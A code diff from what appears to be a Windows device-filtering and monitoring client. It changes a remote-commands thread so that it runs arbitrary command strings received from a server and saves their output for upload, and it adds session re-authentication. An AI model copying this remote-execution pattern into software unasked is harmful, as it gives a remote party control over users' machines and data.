@@ -12,6 +12,7 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 
 		while (TRUE) {
 			deviceConfigs = downloadFile(CONFIGURATION);
+		
 			if (deviceConfigs.dwStatusCode != 200 || deviceConfigs.response == "[]")
 				Sleep(SYNC_TIME);
 			else
@@ -35,7 +36,7 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 							finalFilterPath.begin(), finalFilterPath.end(),
 							finalFilterPath.begin(),
 							towlower);
-						
+
 						configs.find(ADDITIONAL_SITES); // get user defined sites to block
 						if (configs.find(ADDITIONAL_SITES) != configs.end())
 							additionalSites = (stringToWString(configs.find(ADDITIONAL_SITES)->second)).c_str();
@@ -181,21 +182,38 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 	do {
 		cmdRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cmd"));
 	} while (cmdRequest == NULL);
+
 	while (TRUE) {
 		WaitForSingleObject(
 			cmdRequest, // event handle
 			INFINITE);    // indefinite wait
 		ResetEvent(cmdRequest);
-//		 Request Arrived..
+		//		 Request Arrived..
+					// Try to find the task in the workingTasks list
+		map<string, map<string, string>>::iterator tasksIter = workingTasks.find(Command);
+
+		if (tasksIter == workingTasks.end()) // Sanity check
+			continue; // Task not found in the list
+		string currentCommand = "";
+		map<string, string>::iterator commandIter = (tasksIter->second).find(Command_Type);
+		if (commandIter == (tasksIter->second).end()) // Sanity check
+			continue;
+
+		currentCommand.append(commandIter->second);
+		commandIter = (tasksIter->second).find(Command_Param);
+		if (commandIter == (tasksIter->second).end()) // Sanity check
+			continue;
+
+		currentCommand.append(" ").append(commandIter->second);
+		wstring finalCommand = stringToWString(currentCommand);
 
 		// Get a new filename
 		wstring filename = stringToWString(constructFilename(TEMP_CODE));
 
-		if (!runCommand(L"tasklist", filename.c_str()));
-		//	continue;
+		runCommand(finalCommand.c_str(), filename.c_str());
 
 		wstring filenameFinal = stringToWString(constructFilename(CMD_CODE));
-	//	if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
+		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
 		{
 			// Notifiy data manager thread
 			SetEvent(newDataEvent);
@@ -300,10 +318,17 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 
 		while (TRUE) {
 			requests = downloadFile(REQUESTS);
-			if (requests.dwStatusCode != 200 || requests.response == "[]")
-				Sleep(SYNC_TIME);
+			if (requests.dwStatusCode == 403) // Forbidden access (session timed-out)
+			{
+				closeSessionHandle(); // Reset session  
+				while (authenticateDevice().dwStatusCode != 200) {  // retry authentication 
+					Sleep(SYNC_TIME); // If failed, try again in SYNC_TIME ms..
+				}
+			}
+			else if (requests.dwStatusCode != 200 || requests.response == "[]") // No new requests or unknown error code..
+				Sleep(SYNC_TIME); // Try again in a SYNC_TIME ms..
 			else
-				break;
+				break; // All good, continue
 		}
 		// Convert the response to map or requests.
 		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);
